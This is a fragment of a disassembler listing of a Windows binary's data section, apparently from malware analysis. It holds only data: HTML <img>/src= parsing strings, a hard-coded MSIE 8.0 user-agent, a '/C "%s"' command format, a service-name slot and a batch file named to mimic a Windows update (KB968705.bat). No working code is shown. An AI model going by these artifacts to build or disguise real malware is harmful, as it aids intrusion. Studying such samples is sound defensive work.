.data:0040580B db    0
.data:0040580C db    0
.data:0040580D db    0
.data:0040580E db    0
.data:0040580F db    0
.data:00405810 db    0
.data:00405811 db    0
.data:00405812 db    0
.data:00405813 db    0
.data:00405814 db    0
.data:00405815 db    0
.data:00405816 db    0
.data:00405817 db    0
.data:00405818 db    0
.data:00405819 db    0
.data:0040581A db    0
.data:0040581B db    0
.data:0040581C db    0
.data:0040581D db    0
.data:0040581E db    0
.data:0040581F db    0
.data:00405820 ; char aWidth[]
.data:00405820 aWidth db 'width=',0
.data:00405827 align 4
.data:00405828 ; char aAny[]
.data:00405828 aAny db 'any',0
.data:0040582C ; char aSrc[]
.data:0040582C aSrc db 'src=',0
.data:00405831 align 4
.data:00405834 ; char SubStr[]
.data:00405834 SubStr db 'border=',0
.data:0040583C ; char aImg[]
.data:0040583C aImg db '<img',0
.data:00405841 align 4
.data:00405844 ; char Dest[]
.data:00405844 Dest db 'Mozilla/4.0 (compatible; MSIE 8.0; '
.data:00405844 db 'Windows NT 6.1; Trident/4.0)',0
.data:00405884 ; CHAR Operation[]
.data:00405884 Operation db 'open',0
.data:00405889 align 4
.data:0040588C ; char aCS[]
.data:0040588C aCS db '/C "%s"',0
.data:00405894 ; CHAR PrefixString[]
.data:00405894 PrefixString db '~',0
.data:00405896 align 4
.data:00405898 dword_405898 dd 2D636C62h
.data:0040589C dword_40589C dd 647764h
.data:004058A0 ; CHAR File[]
.data:004058A0 File db 'KB968705.bat',0
.data:004058AD align 10h
.data:004058B0 ; char asc_4058B0[]
.data:004058B0 asc_4058B0 db '._/-',0
.data:004058B5 align 10h
.data:004058C0 dword_4058C0 dd 1
.data:004058C4 align 8
.data:004058C8 ; CHAR WindowName[8]
.data:004058C8 WindowName db 8 dup(0)
.data:004058D0 ; HANDLE Dst
.data:004058D0 Dst dd 0
.data:004058D4 ; HANDLE dword_4058D4
.data:004058D4 dword_4058D4 dd 0
.data:004058D8 dword_4058D8 dd 0
.data:004058DC align 10h
.data:004058E0 ; char *Str2
.data:004058E0 Str2 dd 0
.data:004058E4 ; LPCSTR Str
.data:004058E4 Str dd 0
.data:004058E8 ; LPCSTR lpServiceName
.data:004058E8 lpServiceName dd 0
.data:004058EC ; char *dword_4058EC
.data:004058EC dword_4058EC dd 0
.data:004058F0 ; char *dword_4058F0
.data:004058F0 dword_4058F0 dd 0
.data:004058F4 ; char *dword_4058F4
.data:004058F4 dword_4058F4 dd 0
.data:004058F8 align 10h
.data:00405900 dword_405900 dd 0
.data:00405904 db    0
.data:00405905 db    0
.data:00405906 db    0
.data:00405907 db    0
.data:00405908 db    0
.data:00405909 db    0
.data:0040590A db    0
.data:0040590B db    0
.data:0040590C ; HWND hwnd
.data:0040590C hwnd dd 0
.data:00405910 dword_405910 dd 0
.data:00405914 byte_405914 db 0
.data:00405915 align 4
.data:00405918 dword_405918 dd 0
.data:0040591C dword_40591C dd 0
.data:00405920 dword_405920 dd 0
.data:00405924 dword_405924 dd 0
.data:00405928 dword_405928 dd 0
.data:0040592C dword_40592C dd 0
.data:00405930 dword_405930 dd 0
.data:00405934 dword_405934 dd 0
.data:00405938 align 800h
.data:00405938 _data ends
.data:00405938
.data:00405938
.data:00405938 end start
